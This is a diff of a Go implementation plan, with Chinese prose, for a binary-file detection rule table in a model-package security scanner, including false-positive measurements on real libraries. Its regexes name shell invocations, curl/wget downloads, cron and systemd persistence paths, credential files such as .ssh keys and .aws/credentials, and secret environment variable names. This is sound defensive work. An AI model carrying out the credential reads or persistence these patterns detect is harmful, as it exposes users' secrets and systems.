+		// measurement does not misfire on ordinary libraries: across a measured
+		// 600 shared objects on the host (538 distinct ELFs, 2027 file entries),
+		// none was marked structural, none lacked a section table and none
+		// errored, and the highest executable-section entropy was 6.777009
+		// bits/byte, on libcrypto.so.3's .text (3347362 bytes, read whole rather
+		// than sampled), 0.723 below the 7.5 threshold. libgomp.so's 7.97
+		// .gnu_debugdata is not SHF_EXECINSTR so the extractor never measures it.
+		Severity:    SeverityHigh,
+		Description: "可执行节区熵接近随机 — 代码已被压缩或加密，运行前必须先解包",
 	},
 	"BIN_002": {
 		ID:          "BIN_002",
@@ -2971,6 +6596,37 @@ var binaryOnlyRules = map[string]Rule{
 		Category:    "反序列化执行",
 		Severity:    SeverityHigh,
 		Description: "pickle 流要求反序列化器解析具备进程/IO/网络能力的模块属性 — 加载即执行",
+	},
+	// The four families below carry free-string evidence and are LOW. Their ids
+	// are new rather than shared because PER_001 and CMD_001 are HIGH in the
+	// source table and FIL_001/ENV_001 are MEDIUM - and MEDIUM is not the safe
+	// level either, because under the gate policy it blocks and deletes too.
+	// Giving them LOW under a shared id would make the two arms
+	// disagree about a shared family's severity, which
+	// TestBinaryRulesBorrowSharedFamilies exists to prevent.
+	"CMD_002": {
+		ID:          "CMD_002",
+		Category:    "命令执行（字符串证据）",
+		Severity:    "LOW",
+		Description: "二进制中的字面量呈现命令行形态 — 需人工确认是配置文本还是执行载荷",
+	},
+	"PER_002": {
+		ID:          "PER_002",
+		Category:    "持久化后门（字符串证据）",
+		Severity:    "LOW",
+		Description: "二进制中的字面量呈现持久化形态 — 需人工确认",
+	},
+	"FIL_002": {
+		ID:          "FIL_002",
+		Category:    "敏感文件读取（字符串证据）",
+		Severity:    "LOW",
+		Description: "二进制中的字面量指向敏感路径 — 需人工确认是读取能力还是日志文本",
+	},
+	"ENV_002": {
+		ID:          "ENV_002",
+		Category:    "环境变量（字符串证据）",
+		Severity:    "LOW",
+		Description: "二进制中的字面量是一个密钥型环境变量名 — 需人工确认",
 	},
 }
 
@@ -2988,37 +6644,92 @@ type binaryFamily struct {
 
 // binaryFamilies is the table, in match-precedence order. The order is the
 // precedence: one evidence line produces at most one finding, so the first rule
-// that matches owns the line. A line that two families could describe is
-// therefore counted once, which is what keeps the statistics from
-// double-weighting one defect.
+// that matches owns the line, and a line two families could describe would be
+// counted once rather than double-weighted in the statistics. No two families
+// in the table as written actually overlap (see Match), so that rule is held for
+// the first overlap rather than exercised today.
+//
+// The claim sets are narrower than the source arm's on purpose, and the
+// narrowing is the fix for the false positives this table was measured to have.
+// A rule whose claim is a bare identifier or a substring catches every
+// legitimate file that happens to contain it - which for a model package means
+// a deleted package, not a noisy report.
 var binaryFamilies = []binaryFamily{
 	{
-		// memfd_create and fexecve come before the general command family so
-		// that the more specific family names the finding.
+		// memfd_create and fexecve lead the table so that, if the general
+		// command family's claim is ever widened to cover them, the more
+		// specific family is the one that names the finding. Today CMD_001's
+		// list is anchored and names neither, so the pair does not overlap and
+		// the position is held for that widening rather than exercised now.
 		ID:       "BIN_002",
 		Sources:  []EvidenceSource{SourceDynsym},
 		Patterns: compilePatterns(`^(memfd_create|fexecve)$`),
 	},
 	{
+		// The symbol half of command execution, and the half that is structural:
+		// a dynamic symbol table entry is written by the linker, so a binary that
+		// imports system() has the capability. Only SourceDynsym - the string
+		// half lives in CMD_002 below, because the same word in a literal is not
+		// a capability.
+		//
+		// The same corpus run that produced the NET_002 measurement puts this
+		// family on a legitimate library too: `nm -D` shows
+		// libggml-base.so.0.20.2 importing `execlp`, so CMD_001 reports HIGH on
+		// ggml's own backend loader. That is the same undecided posture the
+		// NET_002 note records, left undecided here for the same reason.
 		ID:      "CMD_001",
-		Sources: []EvidenceSource{SourceDynsym, SourceStrings},
+		Sources: []EvidenceSource{SourceDynsym},
 		Patterns: compilePatterns(
 			`^(system|execve|execv|execvp|execl|execlp|execle|popen|posix_spawn|posix_spawnp|forkpty|WinExec|ShellExecuteA|ShellExecuteW|CreateProcessA|CreateProcessW)$`,
-			`^/bin/(sh|bash|dash|zsh)$`,
-			`^(bash|sh) -c\b`,
-			`\b(curl|wget) -[a-zA-Z]*O?\b.*https?://`,
 		),
 	},
 	{
+		// The client half of raw network use. The set was narrowed to the
+		// outbound-client shape out of the measurement below, and the narrowing
+		// did not achieve what it was for.
+		//
+		// Measured with the wide symbol readers (`nm -D`, or `readelf -sW
+		// --dyn-syms`; plain `readelf --dyn-syms` replaces the symbol name with
+		// `[...]` but keeps the `@GLIBC_x.y` version suffix and index, and the
+		// elision tracks the rendered entry width rather than the name alone, so
+		// even short names like `socket` and `connect` disappear) against the 28
+		// top-level `.so*` entries of this machine's ollama bundle - 22
+		// regular files plus 6 symlinks. The recursive count of regular `.so*`
+		// files is 52, a different set: do not read 52 against 28 as a
+		// regression. The generic and server-side symbols - `bind`, `send`,
+		// `recv` - are imported by libllama-common.so, a legitimate library, so
+		// dropping them did remove that match. But the client symbols were kept,
+		// and they sit in the same
+		// libraries: libllama-common.so.0.1.2 and libllama-server-impl.so both
+		// import `socket`, `connect` and `getaddrinfo` alongside
+		// `bind`/`send`/`recv`, and the CUDA runtime libraries under
+		// cuda_v12/cuda_v13 import `bind`/`connect`/`socket`.
+		//
+		// So on this machine's bundle NET_002 reports HIGH on legitimate
+		// libraries, and under the default `assist` policy, where `Passed` is
+		// `highCount == 0`, that means passed=false for a package that holds one
+		// of them. The "or needs libcurl" half of the original claim does hold:
+		// no library in the bundle carries a curl or ssl DT_NEEDED.
+		//
+		// This is not a mis-written comment; it is a rule posture that was never
+		// decided. Narrowing the pattern set further, dropping the family to
+		// MEDIUM, and requiring it to co-occur with another family are all open,
+		// and this task chooses none of them - it records the measurement and
+		// leaves the decision unmade. The shared id and its severity are the
+		// source arm's, so as written this family stays HIGH.
 		ID:      "NET_002",
 		Sources: []EvidenceSource{SourceDynsym, SourceNeeded},
 		Patterns: compilePatterns(
-			`^(socket|connect|bind|listen|accept|send|sendto|sendmsg|recv|recvfrom|recvmsg|getaddrinfo|gethostbyname|gethostbyaddr|inet_addr|inet_pton|WSAStartup|WSASocketA)$`,
+			`^(socket|connect|getaddrinfo|gethostbyname|gethostbyaddr|inet_addr|inet_pton|WSAStartup|WSASocketA|WSASocketW)$`,
 			`^libcurl\.so`,
 			`^libssl\.so`,
 		),
 	},
 	{
+		// MEDIUM, borrowed from the shared table. It stays: dlopen is ordinary in
+		// legitimate shared objects, but the evidence is structural - the symbol
+		// table says the library declares the capability - and the shared
+		// severity is the source arm's to set.
 		ID:       "DYN_001",
 		Sources:  []EvidenceSource{SourceDynsym},
 		Patterns: compilePatterns(`^(dlopen|dlmopen|dlsym)$`),
@@ -3038,51 +6749,102 @@ var binaryFamilies = []binaryFamily{
 		),
 	},
 	{
-		ID:      "PER_001",
+		// The string half of command execution, at LOW. Only genuine command-line
+		// shapes survive here: a bare symbol name in a literal is what
+		// TestSymbolRulesDoNotMatchStringLiterals refuses, and an unanchored
+		// substring catches a fragment of a concatenated constant pool.
+		ID:      "CMD_002",
 		Sources: []EvidenceSource{SourceStrings},
 		Patterns: compilePatterns(
-			`^crontab`,
-			`/etc/cron[a-z.]*`,
+			`^/bin/(sh|bash|dash|zsh)$`,
+			`^(bash|sh) -c\b`,
+			`\b(curl|wget)\s+.*https?://`,
+		),
+	},
+	{
+		// Token-anchored at both ends. The previous patterns fired on
+		// `'crontabz'` and on `'.profilez\t/etc/cron)'`, both fragments of a
+		// concatenated .pyc constant pool, where a mid-run path always matches an
+		// unanchored pattern. A boundary on the token, not the fragment, is the
+		// fix; raising the severity would not have been.
+		//
+		// The two fragments come from different files, which an earlier version
+		// of this note got wrong by attaching both to one of them.
+		// `'.profilez\t/etc/cron)'` (a TAB, not a space) is the single occurrence
+		// in models/audit/tools/cpg/__pycache__/taint_engine.cpython-312.pyc,
+		// which contains no `crontab` substring at all. `'crontabz'` is in
+		// models/examples/__pycache__/code_security_analyzer.cpython-312.pyc,
+		// where the source literal `r"crontab"` in
+		// models/examples/code_security_analyzer.py has picked up the trailing
+		// `z` from the concatenation - the fragment is real, only the file was
+		// misattributed.
+		ID:      "PER_002",
+		Sources: []EvidenceSource{SourceStrings},
+		Patterns: compilePatterns(
+			`^crontab\b`,
+			`^/etc/cron[a-z.]*`,
 			`(?:^|/)\.bashrc$`,
 			`(?:^|/)\.bash_profile$`,
-			`systemctl (enable|start)`,
-			`/etc/systemd/system`,
-			`/etc/init\.d`,
+			`^systemctl\s+(enable|start)`,
+			`^/etc/systemd/system`,
+			`^/etc/init\.d`,
 		),
 	},
 	{
-		ID:      "FIL_001",
+		// Same anchoring requirement, same measurement. `'.aws/credentialsz'`
+		// and `'.ssh/id_rsaz'` were the observed fragments; the trailing `z` is
+		// proof the match was a fragment of a concatenated run.
+		//
+		// The `$` alone is not what refuses them. It refuses a *suffixed*
+		// neighbour - `'.aws/credentialsz'` stops matching `\.aws/credentials$`
+		// because the `$` will not sit at the `z`. It does not refuse an
+		// *invented* key name: `id_[a-z]+` consumes `id_rsaz`'s trailing `z`
+		// happily, so the `$` is satisfied and the fragment matches anyway. Only
+		// a closed key-name list refuses that, which is why the `.ssh`
+		// alternation names the four real keys rather than reaching for
+		// `id_[a-z]+`.
+		ID:      "FIL_002",
 		Sources: []EvidenceSource{SourceStrings},
 		Patterns: compilePatterns(
-			`/etc/(?:passwd|shadow|sudoers)`,
-			`(?:^|/)\.ssh/(?:id_[a-z]+|authorized_keys|config)`,
-			`(?:^|/)\.aws/credentials`,
-			`(?:^|/)\.kube/config`,
-			`/proc/self/environ`,
+			`^/etc/(?:passwd|shadow|sudoers)$`,
+			`^(?:.*/)?\.ssh/(?:id_(?:rsa|dsa|ecdsa|ed25519)|authorized_keys|config)$`,
+			`^(?:.*/)?\.aws/credentials$`,
+			`(?:^|/)\.kube/config$`,
+			`^/proc/self/environ$`,
 		),
 	},
 	{
-		ID:      "ENV_001",
+		// Exact case, and no (?i). The source arm's ENV_001 carries (?i) because
+		// it matches `os.getenv("AWS_SECRET_ACCESS_KEY")`, an upper-case name by
+		// convention; the same flag here made the lower-case identifier
+		// `private_key` match `PRIVATE_KEY` in security.cpython-312.pyc. A bare
+		// identifier is a name, not a secret read.
+		ID:      "ENV_002",
 		Sources: []EvidenceSource{SourceStrings},
 		Patterns: compilePatterns(
-			`(?i)^(AWS_SECRET_ACCESS_KEY|AWS_ACCESS_KEY_ID|API_KEY|SECRET_KEY|ACCESS_TOKEN|PRIVATE_KEY|GITHUB_TOKEN)$`,
+			`^(?:AWS_SECRET_ACCESS_KEY|AWS_ACCESS_KEY_ID|API_KEY|SECRET_KEY|ACCESS_TOKEN|PRIVATE_KEY|GITHUB_TOKEN)$`,
 		),
 	},
 	{
-		ID:      "BIN_001",
-		Sources: []EvidenceSource{SourceEntropy},
+		ID:       "BIN_001",
+		Sources:  []EvidenceSource{SourceEntropy},
 		Patterns: compilePatterns(`^high-entropy-`),
 	},
-	{
-		ID:      "OBF_001",
-		Sources: []EvidenceSource{SourceStrings},
-		Patterns: compilePatterns(
-			// A long base64 blob left in a code slot. The length floor is what
-			// keeps this from firing on padded text.
-			`^[A-Za-z0-9+/]{120,}={0,2}$`,
-		),
-	},
 }
+
+// There is deliberately no OBF_001 family here, and its absence is a decision
+// rather than an omission. The source arm keeps OBF_001 for
+// `base64.b64decode(...)` and friends, where the evidence is a call. The binary
+// arm originally matched `^[A-Za-z0-9+/]{120,}={0,2}$` against SourceStrings,
+// and that is where 23 of 28 legitimate shared libraries fired: the pattern
+// matches any 120-plus-byte run drawn from the base64 alphabet, which is
+// everywhere in binary data and in .pyc string tables - a plain 120-digit
+// decimal run in libllama.so.0.1.2 is enough. Tightening the alphabet or raising
+// the floor does not help, because the runs are real and long; the honest fix is
+// an occupancy guard on a whole unit (the section or member must be
+// predominantly the encoded run, not merely contain one), and no producer for
+// that unit-level verdict exists in this plan. So the family is dropped here and
+// the absence is stated rather than left to be rediscovered.
 
 // BinaryMatcher resolves the binary family table against the shared severity
 // table and matches evidence lines against it.
@@ -3132,10 +6894,22 @@ func (m *BinaryMatcher) Rules() []Rule {
 // Match returns the first rule the line matches, or nil.
 //
 // First rather than all: the finding list is what the statistics and the LLM
-// quota are computed from, and one evidence line is one observation. A line that
-// two families could describe - memfd_create is both an execution capability and
-// a dynamic-loading one - is reported under the more specific family, which is
-// why the table order is the precedence and is asserted by a test.
+// quota are computed from, and one evidence line is one observation. A line two
+// families could describe is reported once, under the earlier family.
+//
+// That order is the intended rule, but it is not observable in the table as it
+// stands, because no two families overlap: each pair differs in source, in
+// pattern text, or in both, so no line is described by more than one and the
+// order never decides anything. The pair that looks like the exception is not
+// one - BIN_002 claims memfd_create and fexecve while CMD_001's command list is
+// anchored and simply does not contain fexecve, so nothing is claimed twice.
+// This doc used to cite memfd_create as an overlap the BIN_002-before-CMD_001
+// order resolved; that was wrong. The order is a rule held for the first real
+// overlap, not one doing work today, and no test asserts it for the same reason:
+// with nothing to assert against, the only way to test precedence now would be
+// to tilt the table into an overlap it does not have, which pins a fiction
+// rather than the code. When a family that genuinely overlaps an earlier one is
+// added, that is the moment to add the test and to say here which one wins.
 func (m *BinaryMatcher) Match(line EvidenceLine) *Rule {
 	for i := range m.order {
 		fam := &m.order[i]
@@ -3154,6 +6928,10 @@ func (m *BinaryMatcher) Match(line EvidenceLine) *Rule {
 // MatchAll returns one rule per matching line, in listing order, with the
 // index of the matched line. It is a slice-building convenience over Match so
 // that the scanner does not re-implement the precedence loop.
+//
+// The binary scanner is its caller: binary_scanner.go calls MatchAll rather
+// than re-implementing the precedence loop. No test calls it yet, so it is
+// exercised only through the scanner.
 func (m *BinaryMatcher) MatchAll(lines []EvidenceLine) []binaryMatch {
 	var out []binaryMatch
 	for i := range lines {
@@ -3199,15 +6977,21 @@ func BinaryRuleIDs() []string {
 
 - [ ] **Step 4: 把新 rule id 补进 `ruleSuggestionMap`**
 
-`internal/codeaudit/audit.go` 的 `ruleSuggestionMap` 目前只有源码臂的 13 个 id。二进制通道的 `BIN_001`、`BIN_002`、`PKL_001` 不在其中，落到 `SuggestionForRule` 的兜底文案上——报告会给出一条毫无指向的修复建议。补进去：
+`internal/codeaudit/audit.go` 的 `ruleSuggestionMap` 目前只有源码臂的 13 个 id。二进制通道的规则 id（`BIN_001`、`BIN_002`、`PKL_001`，以及 Step 3 新增的四个字符串族 `CMD_002`、`PER_002`、`FIL_002`、`ENV_002`）不在其中，落到 `SuggestionForRule` 的兜底文案上——报告会给出一条毫无指向的修复建议。补进去：
 
 ```go
 	"EMB_004": "不要将数据编码后嵌入模型权重",
 	"BIN_001": "确认该二进制段是否经过加壳/加密；若无需动态解包，改用未加壳的构建产物",
 	"BIN_002": "确认该二进制为何需要敏感能力；移除不必要的敏感符号引用",
 	"PKL_001": "不要反序列化不可信 pickle；改用 weights_only=True 或 safetensors 等纯数据格式",
+	"CMD_002": "确认该命令字符串是否来自可信构建；非必要不保留可执行的命令行",
+	"PER_002": "确认该持久化路径引用是否为良性常量；非必要不写入自启动/计划任务位置",
+	"FIL_002": "确认该敏感文件路径字符串的用途；非必要不引用凭证或系统文件",
+	"ENV_002": "确认该环境变量名是否为误报的字面量；凭证读取请集中在可信配置层",
 }
 ```
+
+`CMD_002`/`PER_002`/`FIL_002`/`ENV_002` 与源码臂的 `CMD_001`/`PER_001`/`FIL_001`/`ENV_001` **不是同一 id**，各自要有自己的条目：它们只是同一能力在字符串证据上的低置信度版本，兜底文案会读出错误的严重级语境。
 
 - [ ] **Step 5: 加一条完整性测试，防止下次新增规则时再漏**
 
@@ -3231,12 +7015,62 @@ func TestEveryBinaryRuleHasASuggestion(t *testing.T) {
 - [ ] **Step 6: 跑测试确认通过**
 
 ```bash
-go test ./internal/codeaudit/ -run 'TestBinaryRules|TestBinaryOnly|TestMatchEvidence|TestSymbolRules|TestEveryBinaryRuleHasASuggestion' -v 2>&1 | tail -20
+go test ./internal/codeaudit/ -run 'TestBinaryRules|TestBinaryOnly|TestBinaryFamily|TestBinaryTable|TestMatchEvidence|TestSymbolRules|TestEveryBinaryRuleHasASuggestion' -v 2>&1 | tail -20
 ```
 
-预期全 PASS。若 `TestBinaryRulesBorrowSharedFamilies` 报 `BIN_001` 之类的 id 冲突，说明 `binaryOnlyRules` 里写了与共享表相同的 id——修正 id 而不是放宽断言。
+预期全 PASS。若 `TestBinaryOnlyFamiliesDoNotCollide` 报 `BIN_001` 之类的 id 冲突，说明 `binaryOnlyRules` 里写了与共享表相同的 id——修正 id 而不是放宽断言。
 
-- [ ] **Step 7: 提交**
+- [ ] **Step 7: 用真实语料手动跑一遍，把数字记在这里**
+
+两条测试都只跑合成夹具，而夹具是我挑的。上线前必须拿本仓库真实语料跑一次完整表，并**把实测数字写回本节**，让后来者能照着复现：
+
+```bash
+# 1) 28 个 ollama 共享库 + 658 个 .pyc，看有没有 HIGH
+#    （期望：0 个 HIGH；这正是本轮误报的来源，见 §5）
+# 2) /home/hjy/taa/models 全量，记录每族的 finding 数
+```
+
+**已测得的基线（本轮审计，写表时复核过）**，用来判断一次新跑的偏移是不是回归：
+
+- 语料中**没有任何真实 ELF/`.so`**（`find models -type f \( -name '*.so' -o -name '*.so.*' \)` 加上 ELF 魔数扫描都是 0）——`models/` 不是 `.so` 的来源，真正的 `.so` 只有 ollama 那 28 个。所以**宿主机的 `.so` 与这个语料交付的东西不成比例**，任何「按 `.so` 调参」的想法都要先想清楚它服务的是谁。
+- 28 个共享库中，旧 `OBF_001`（base64 长串）命中 **23** 个；旧 `NET_002`（含 `bind`/`send`/`recv`）至少命中 `libllama-common.so.0.1.2`（它导入 `bind recv send`——**本轮复核补正**：它同时也导入 `socket`/`connect`/`getaddrinfo`，旧写法「不含 `socket`/`connect`」是错的，见下一条实测与 Task 8 `binary_rules.go` 里 `NET_002` 的注释）；旧 `PER_001`/`FIL_001`/`ENV_001` 的片段命中来自 `taint_engine.cpython-312.pyc`（`'crontabz'`、`'.aws/credentialsz'`、`'.ssh/id_rsaz'`、`.profilez /etc/cron)`）与 `security.cpython-312.pyc`（小写 `private_key` 撞 `PRIVATE_KEY`）。**新表必须让这些全部归零**，这正是 `TestBinaryTableProducesNoHighFindingsOnLegitimateInputs` 的七个夹具组在钉的东西。
+- **代码两处 `23 of 28` 的分母口径未写明，与本节 `28` 是否同一集合未证，留最终复审**（`binary_rules.go:29-30`、`:309-310`）。这里的 `28` 与本节讲清的「28 = 顶层 22 个常规文件 + 6 个符号链接」**大概率同源**（同为顶层 glob 口径），所以**不是错误**，只是代码那句没写明口径；而它描述的是**已废弃的 `OBF_001` 原始模式**的历史测量，重测需重建已删除的模式，上一轮复审已判其出界。故本计划对代码这两处**不改数字、不加括号**，只在此登记为待最终复审的口径项。
+
+- 可执行节区熵：把宿主上 **600 个共享对象**（去重后 **538** 个不同 ELF；把每个枚举到的文件条目都算上是 **2027** 个）全跑一遍，**0 个被判结构性、0 个无节表、0 个报错**，最高 **6.777009** bits/byte，出现在 **`libcrypto.so.3` 的 `.text`**（3347362 字节，**整节读完**，不是抽样前缀），与 7.5 阈值之间余量 **0.723** bits。早先只量了 ollama 那 28 个（最高 6.75），样本扩大二十倍而最高值只挪了百分之一不到，这正是"这条判定不误伤普通库"的强度所在（`libgomp.so` 的 7.97 在非可执行 `.gnu_debugdata`，抽取器根本不测）。**这个数是被阻断导入那条规则的唯一支撑，所以它必须是整节读出来的**——一个只覆盖前缀的熵值和一个覆盖整节的熵值在报告里长得一样，而前者不能用来给一条会拒绝导入的规则背书。
+
+- **新表在真实库上的实测（本轮，宿主 `teellm/models/ollama/lib/ollama/`，把这条路径下的 `.so` 全跑一遍）**：
+  - **21 个是被截断的 CUDA/cuDNN/NCCL/MLX 库，而且这个数字有两套口径，不要用一个盖掉另一个**：按**磁盘**数，是 **21 个截断 ELF**——其中 **20 个恰好 10485760 字节（10 MiB）**，另一个是 `vulkan/libggml-vulkan.so`（**10747904** 字节），20 + 1 = 21；按**生产路径**数，也是 **21 个**——`elf.NewFile` 对这 21 个**全部**直接返回 `EOF`（本轮用 `elf.Open` 逐个跑了这 52 个 `.so`，报 EOF 的正是这一批 21 个，52 − 21 = 31 个能解析出来，两个口径逐文件对得上）。ELF 头把节头表指向 34483600–751773392 字节（约 33–717 MB）的偏移，而文件只有 10 MiB，所以 `debug/elf` 读节头时撞在 EOF 上。**这里保留 21**：曾经出现过的"22 个恰好 10 MiB"在磁盘上复现不出来（全仓库按 `-size 10485760c` 数就是 20 个），所以不采用 22。另外这 21 个**全部**落在 `teellm/models/ollama/lib/ollama/` 下（`cuda_v12` 3 个、`cuda_v13` 3 个、`mlx_cuda_v13` 14 个、`vulkan` 1 个）；`deploy/guest-build/semgrep-payload/rootfs` 下面有 88 个 `.so*`，但**截断的一个也没有**——Task 5 与 `binary_scanner.go` 里"`teellm/` 与 `deploy/…` 下有 21 个"是把两个根并列写在一起的，实测只来自 `teellm/` 这一个根（代码侧那句的修正在另一批里，这里只留实测口径）。它们走的是**抽取出错**（`parse elf …: EOF`）这条路径，**不产出 finding**，计入 `Incomplete`——这正是 Task 7 那条"截断的库是抽取出错、不是跳过"的现成形状（不在 `models/` 下；`models/` 一个真实 `.so` 都没有）。
+  - 能解析出来的那 31 个库里，命中 **HIGH** 的一共是 **9 个库文件**（按族拆：`NET_002` **7 个** + `CMD_001` **2 个**）：`libllama-common.so.0.1.2` 与 `libllama-server-impl.so` 导入 `socket`/`connect`/`getaddrinfo`/`inet_pton` → **`NET_002`（HIGH）**；`cuda_v12/libcudart.so.12.8.90`、`cuda_v13/libcudart.so.13.0.96`、`mlx_cuda_v13/libcudart.so.13.0.96`、`mlx_cuda_v13/libcudnn_cnn.so.9.25.0`、`mlx_cuda_v13/libcudnn_ext.so.9.25.0` 导入 `connect`/`socket` → **`NET_002`（HIGH）**；`libggml-base.so.0.20.2` 导入 `execlp` → **`CMD_001`（HIGH）**；`mlx_cuda_v13/libgfortran.so.5.0.0` 导入 `system` → **`CMD_001`（HIGH）**。（`filepath.Walk` 按 `lstat` 跳软链接，所以 `libggml-base.so.0`、`libllama-common.so.0` 这两个 `.so`→`.so.N` 软链接条目**不会被读**；把它们算进来才有更大的条目数。）
+
+    **这里的"9"而不是"8"，是一次漏数，不是口径差异。** 早先那一轮 `CMD_001` 只按别处举过的 `execlp` 一个符号去扫，没有走该族的完整 alternation，于是漏掉了 `mlx_cuda_v13/libgfortran.so.5.0.0` 的 `system`。`system` 是 `CMD_001` 的正成员（`binary_rules.go` 的 `CMD_001` 模式串里第一个就是它），这是一次真实的指令执行命中，不是误报——记在这里，免得后来者拿旧的"8"当成回归基线。
+  - **"9"不随口径放宽而变，这才是它可信的地方。** `SourceDynsym` 不是这批库**唯一**的证据来源：在同一批文件上还能发 HIGH 的另外两条路，一条是 `SourceEntropy`（`BIN_001`，可执行节区熵近随机），一条是 `NET_002` 自己的 `SourceNeeded` 分支（`^libcurl\.so` / `^libssl\.so`）。两条都实测过，**一个文件都不加**：(a) 熵——把每个可读文件的所有 `SHF_EXECINSTR` 节**整节**（不是前缀采样）算 Shannon 熵，全树最高 **6.744751** bits/byte，出现在 `libggml-cpu-sapphirerapids.so` 的 `.text`（**1289897** 字节，整节读完），距 7.5 的阈值还差 **0.755** bits，`BIN_001` 一个都不触发（宿主 600 个共享对象那轮的最高值是 6.777009，同一个量级）；(b) `DT_NEEDED`——全树**没有任何** `libcurl`/`libssl` 的 `DT_NEEDED` 条目，`SourceNeeded` 分支一个都不加。于是"只算 dynsym"与"三源齐上"给出同一个数：**9**。这条论证要写进记录，是因为这个结论的强度不来自"我扫了哪些符号"，而来自"把所有能发 HIGH 的证据来源都走一遍，还是 9"。
+  - **三个数字的关系一次写清，免得后来者把口径差当成回归偏移。** `teellm/models/ollama/lib/ollama/` 下**顶层条目 28 个**（22 个普通 `.so*` + 6 个软链接）——本记录下面几条与 §3 里说的"28 个 ollama 共享库"（"标定误报用的那 28 个 ollama 库"、旧 `OBF_001` 命中 23 个、"单节最大 2 901 464 字节"）用的都是**这个顶层口径**；**递归下去普通 `.so*` 是 52 个**，这才是本节"9 个命中"与上面截断口径的数（连软链接一起算是 58 个**条目**，但 `filepath.Walk` 按 `lstat` 根本不读软链接，所以有效输入是 52）。于是 52 = 21 个截断 + 31 个可解析，其中 **9 个命中 HIGH**。`-maxdepth 1` 对递归、条目对普通文件，两种口径各自自洽；拿 52 去比 28 会读出一个不存在的偏移。
+  - **这 9 个命中全部是合法库，而 `CMD_001`/`NET_002` 都是 HIGH**，所以只要这样的库进了模型包，`passed` 就是 false，这次导入会被拒绝（`import_processing.go:655-660` 的 `cleanDirContents` 已由 Task 11a 移除），并留下一份说这个包不安全的报告。这正是 §5 里 `NET_002` 那条**未裁决取舍**的实测来源（三种候选写在 Task 8 `binary_rules.go` 的 `NET_002` 注释里）。
+**上面那 9 个的复跑命令**（口径 = 只算普通文件、软链接不计，递归含 `cuda_v12`/`cuda_v13`/`mlx_cuda_v13`/`vulkan`；符号面 = `nm -D --no-demangle` 的 `U` 行剥掉 `@GLIBC_2.2.5` 这类版本后缀后的**裸名**，对应 `collectELFReader` 收的 `SHN_UNDEF && STB_GLOBAL`；规则面 = 所有能在 `SourceDynsym` 上发 HIGH 的族。`vulkan/libggml-vulkan.so` 那个截断库在 `nm -D` 下只报 `file too short`，所以它落在上面那条截断口径里、不在这里产出命中。**最后一行以非零退出是循环末尾那个 `[ -n "$h" ]` 的返回值，不是命令失败**）：
+
+```bash
+cd /home/hjy/taa
+root=teellm/models/ollama/lib/ollama
+net='^(socket|connect|getaddrinfo|gethostbyname|gethostbyaddr|inet_addr|inet_pton|WSAStartup|WSASocketA|WSASocketW)$'
+cmd='^(system|execve|execv|execvp|execl|execlp|execle|popen|posix_spawn|posix_spawnp|forkpty|WinExec|ShellExecuteA|ShellExecuteW|CreateProcessA|CreateProcessW)$'
+bin='^(memfd_create|fexecve)$'
+find "$root" -type f -name '*.so*' | sort | while read -r f; do
+  u=$(nm -D --no-demangle "$f" 2>/dev/null | awk '$(NF-1)=="U"{n=$NF; sub(/@.*/,"",n); print n}')
+  h=""
+  printf '%s\n' "$u" | grep -qE "$bin" && h="$h BIN_002"
+  printf '%s\n' "$u" | grep -qE "$cmd" && h="$h CMD_001"
+  printf '%s\n' "$u" | grep -qE "$net" && h="$h NET_002"
+  [ -n "$h" ] && printf '%s ->%s\n' "${f#$root/}" "$h"
+done
+```
+
+- `PKL_001`（pickle 反序列化执行，HIGH）本轮在真实语料上命中 **0** 次——这与下一条方向性坦白**一致**（被跑过的真实 pickle 全是良性的），不是它的反例；它 HIGH 档的双向性仍未验证。
+
+一条**方向性**的坦白，必须写在任务里而不是留给读者推断：**本节没有任何证据证明 `PKL_001` 会命中一个*恶意* checkpoint。** 所有被采样、被跑过解释器的真实 pickle 都是良性的（真 checkpoint 只证明解释器能读出目标，不能证明恶意目标会被判成 HIGH）。`PKL_001` 是 HIGH 档，而 HIGH 会阻断导入并留下一份错误的报告，所以它的双向性**未经验证**：已知的是它不会误伤良性样本（上面的语料跑），未知的是它对恶意样本的命中率。补这个方向的唯一办法是造一个真正会执行 `posix.system` 的恶意 pickle 夹具（Task 4/Task 9 的合成夹具即用于此），不要用「跑过真实 checkpoint」冒充两边都验过。
+
+- **`NewEngine` 拒绝 `EngineNameBinary`/`EngineNameCPG` 这两个不可选名字，这件事由 `internal/codeaudit/engine_select_test.go` 的 `TestNewEngineRejectsTheNonSelectableChannelNames` 钉住。** 该测试表驱动遍历这两个名字（子测试 `name=<name>`），逐个断言 `NewEngine` 返回非 nil 错误、不返回可用 engine、且错误信息里出现被拒的名字。钉它的理由：这两个名字是**通道**而不是**可选 Tier 1 引擎**——`EngineNameCPG` 接在某个 Tier 1 引擎之后跑，`EngineNameBinary` 叠在某个引擎之上额外跑，部署只配一个源引擎，把通道名填进 `Engine` 要的是 `NewEngine` 跑不出来的东西，所以默认分支必须报错、而不是回落成一次正则扫描。本计划没有为这个既有文件造整文件 fence——它不属于任何任务的新增内容，这条记录就是它在计划里的坐标。
+
+- [ ] **Step 8: 提交**
 
 ```bash
 gofmt -l internal/codeaudit/ ; go vet ./internal/codeaudit/
@@ -3250,6 +7084,7 @@ git commit -m "feat(audit): add the binary rule table, borrowing shared families
 
 **Files:**
 - Create: `internal/codeaudit/binary_scanner.go`
+- Modify: `internal/codeaudit/rules.go`, `internal/codeaudit/cpg_analysis.go`
 - Test: `internal/codeaudit/binary_scanner_test.go`
 
 - [ ] **Step 1: 写失败测试**
@@ -3260,6 +7095,7 @@ git commit -m "feat(audit): add the binary rule table, borrowing shared families
 package codeaudit
 
 import (
+	"encoding/binary"
 	"os"
 	"path/filepath"
 	"testing"
@@ -3277,10 +7113,20 @@ func newTestBinaryScanner(cfg BinaryConfig) (*BinaryScanner, error) {
 // to the source channel, and everything with binary content or a binary
 // extension is claimed. The claim set is what MergeBinaryFindings uses to decide
 // which files the source channel must not also be believed about.
+//
+// empty.py is the degenerate case and it is here rather than in its own test
+// because it is the same question: a zero-byte file is classified KindText (see
+// TestClassifyBinaryEmptyFile), so it is not claimed and not counted. What makes
+// it worth pinning is that the wrong reading of os.File.Read - the one that
+// treats io.EOF as a failure - turns every empty file into an unreadable one,
+// which ScanDirectory counts Incomplete and which withholds the pass. An empty
+// __init__.py is routine, so that mistake fails a legitimate package, and it is
+// invisible in a claim set that never contains an empty file.
 func TestBinaryScannerClaimsOnlyBinaryFiles(t *testing.T) {
 	dir := t.TempDir()
 	writeTestFile(t, dir, "train.py", "import os\n")
 	writeTestFile(t, dir, "notes.txt", "just prose\n")
+	writeTestFile(t, dir, "empty.py", "")
 	writeTestFile(t, dir, "libevil.so", "#!/bin/sh\necho hi\n")
